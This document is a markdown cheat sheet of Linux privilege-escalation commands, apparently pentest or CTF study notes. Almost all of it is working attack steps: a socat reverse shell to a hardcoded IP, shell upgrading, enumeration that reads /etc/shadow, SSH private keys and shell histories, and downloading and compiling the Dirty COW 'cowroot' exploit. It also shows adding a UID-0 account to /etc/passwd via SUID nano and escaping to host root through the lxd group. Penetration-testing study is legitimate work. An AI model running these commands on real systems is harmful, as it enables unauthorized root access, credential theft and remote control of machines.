### :panda_face: References Linux privilege escalation

- [g0tmi1k basic linux escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [hacktricks.xyz linux escalation checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)


#### :panda_face: Life after Netcat [nc -nvlp 8133]

[pentestMonkey reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
```
# go from nc shell to python spawned shell

python -c ‘import pty; pty.spawn(“/bin/sh”)’
```

```

On Kali (listen): socat file:`tty`,raw,echo=0 tcp-listen:4444
On Victim (launch): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
    # If socat isn’t installed, you’re not out of luck. 
    # There are standalone binaries that can be downloaded from this awesome Github repo:
    https://github.com/andrew-d/static-binaries
```

```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

```

### :panda_face: rough n ready priv esc steps

##### :panda_face: priv escal steps
```
cat /etc/issue
cat /proc/version
hostname
uname -a
searchsploit linux kernel ##.## –exclude=”/dos/”
cat /etc/passwd
id
who
w
sudo -l
ifconfig -a
netstat -antup
arp -e
ps aux
ps aux | grep root
ls -ls /etc/ | grep .conf
ls -ls /var/www/html/
find /* -user root -perm -4000 -print 2>/dev/null
##-rwsr-xr-x [SUID exploitation eg using nano to edit /etc/passwd - see below] 
cat /etc/fstab
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
find /etc -perm -2 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
wget http://www.securitysift.com/download/linuxprivchecker.py
wget http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
./unix-privesc-check standard
./unix-privesc-check detailed
wget https://www.exploit-db.com/download/40616 -O cowroot.c
gcc cowroot.c -o cowroot -pthread
./cowroot
echo 0 > /proc/sys/vm/dirty_writeback_centisecs

```

##### :panda_face: SUID exploit of nano and etc/passwd
```
find /* -user root -perm -4000 -print 2>/dev/null
[nano]
perl -e 'print crypt("YourPasswd", "salt"),"\n"'
perl -e 'print crypt("pom", "pom"),"\n"'
nano /etc/passwd
pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
su pom [pass pom]
```

##### :panda_face: exploit  ‘lxd’ group
```
id
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python -m SimpleHTTPServer 80
cd /tmp
wget http://[IP]/alpine-v3.12-x86_64-BLAH_BLAH.tar.gz
lxc image import alpine-v3.12-x86_64-BLAH_BLAH.tar.gz --alias myimage
lxc image list
lxc init myimage shell -c security.privileged=true
lxc config device add shell mydevice disk source=/ path=/mnt/root recursive=true
lxc start shell
lxc ls
lxc exec shell /bin/sh
cat /mnt/root/etc/os-release
```



#### :panda_face: OS, Kernal, Host, users
    cat /etc/issue
    cat /proc/version
    hostname
    uname -a
    cat /etc/passwd
    cat /etc/issue
    cat /etc/*-release
    cat /etc/lsb-release      # Debian based
    cat /etc/redhat-release   # Redhat based
    cat /proc/version
    uname -a
    uname -mrs
    rpm -q kernel
    dmesg | grep Linux
    ls /boot | grep vmlinuz-

#### :panda_face: Current user / users
    id
    who
    w
    sudo -l
    last
    cat /etc/passwd | cut -d: -f1    # List of users
    grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
    awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
    cat /etc/sudoers

#### :panda_face: Passwords in files
    cat /etc/passwd
    cat /etc/shadow
    grep -i user [filename]
    grep -i pass [filename]
    grep -C 5 "password" [filename]
    find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
    

#### :panda_face: Networking
    ifconfig -a
    route
    netstat -antup
    arp -e

#### :panda_face: Config files / system variables
    ls -ls /etc/ | grep .conf
    cat /etc/profile
    cat /etc/bashrc
    cat ~/.bash_profile
    cat ~/.bashrc
    cat ~/.bash_logout
    env
    set


#### :panda_face: Web directory
    ls -ls /var/www/html/

#### :panda_face: Running applications, printers, and services
    ps aux
    ps -ef
    top
    ps aux
    dpkg -l
    rpm -qa
    find /* -user root -perm -4000 -print 2>/dev/null
    lpstat -a
    cat /etc/services
    ls -alh /usr/bin/
    ls -alh /sbin/
    dpkg -l
    rpm -qa
    ls -alh /var/cache/apt/archivesO
    ls -alh /var/cache/yum/
    

#### :panda_face: Weak file permissions
    find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root #writable directories
    find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root # directories for root
    find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null # Files
    find /etc -perm -2 -type f 2>/dev/null # Files in /etc/
    find / -writable -type d 2>/dev/nul # Directories
    ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
    ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
    ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
    ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
    find /etc/ -readable -type f 2>/dev/null               # Anyone
    find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone


#### :panda_face: Scheduled jobs
    crontab -l
    ls -alh /var/spool/cron
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/crontabs/root

#### :panda_face: Other important information about the system / sentive information.
    at /etc/fstab
    cat /etc/passwd
    cat /etc/group
    cat /etc/shadow
    ls -alh /var/mail/
    ls -ahlR /root/
    ls -ahlR /home/
    cat ~/.bash_history
    cat ~/.nano_history
    cat ~/.atftp_history
    cat ~/.mysql_history
    cat ~/.php_history

#### :panda_face: Private Keys
    cat ~/.ssh/authorized_keys
    cat ~/.ssh/identity.pub
    cat ~/.ssh/identity
    cat ~/.ssh/id_rsa.pub
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_dsa.pub
    cat ~/.ssh/id_dsa
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /etc/ssh/ssh_host_dsa_key.pub
    cat /etc/ssh/ssh_host_dsa_key
    cat /etc/ssh/ssh_host_rsa_key.pub
    cat /etc/ssh/ssh_host_rsa_key
    cat /etc/ssh/ssh_host_key.pub
    cat /etc/ssh/ssh_host_key

### :panda_face:# Exploiting SUID permissions

- SUID = ‘set user ID ‘ - allows low privileged users to execute a file as the file owner.
    - Example ping and Nmap - need root permissions to open raw network sockets and create network packets.
- The SUID feature enhances security because you are able to grant root privileges for a single application for only when it’s needed. However, SUID can also become a serious security issue when an application is able to execute commands or edit files.
- If the SUID is set as root then commands will also be executed as root.
- Exploiting Nano SUID
    ```
    chmod u+s /bin/nano
    find /* -user root -perm -4000 -print 2>/dev/null
    perl -e 'print crypt("pom", "pom"),"\n"'
    ### Add user to nano /etc/passwd
    pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
    ```
#### :panda_face: Mounting the root filesystem in a container - LXD exploitation

- [Walkthrough](https://github.com/D4nk0St0rM/ethicalhacking_d4nk0_method_build/blob/main/assets/Linux%20-%20LXD%20-%20Mounting%20the%20root%20filesystem%20in%20a%20container.pdf)


#### :panda_face: Exploits and tools

- LinPEAS – Linux Privilege Escalation Awesome Script: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
    ```
    wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
    ```
- Linux Priviledge Escalation Checker: 
    ```
    wget http://www.securitysift.com/download/linuxprivchecker.py
    ```
- Unix Privideldge Escalation Checker: http://pentestmonkey.net/tools/audit/unix-privesc-check
    ```
    ./unix-privesc-check standard
    ./unix-privesc-check detailed
    ```
- [Linux Privilege Escalation Check List](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Exploit Suggester - v2.0](https://github.com/jondonas/linux-exploit-suggester-2)
- [Linux Kernal Exploits](https://github.com/SecWiki/linux-kernel-exploits)
- [More Linux Kernal Exploits](https://github.com/lucyoa/kernel-exploits)
    - And more... : https://github.com/bwbwbwbw/linux-exploit-binaries
    - ...more...: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
    - Exploits & Shellcodes: https://github.com/offensive-security/exploitdb
    - Binary Exploits: https://github.com/offensive-security/exploitdb-bin-sploits
    - Papers: https://github.com/offensive-security/exploitdb-papers

#### :panda_face: Compiling Exploits
```
wget https://www.exploit-db.com/download/40616 -O cowroot.c
gcc cowroot.c -o cowroot -pthread
```

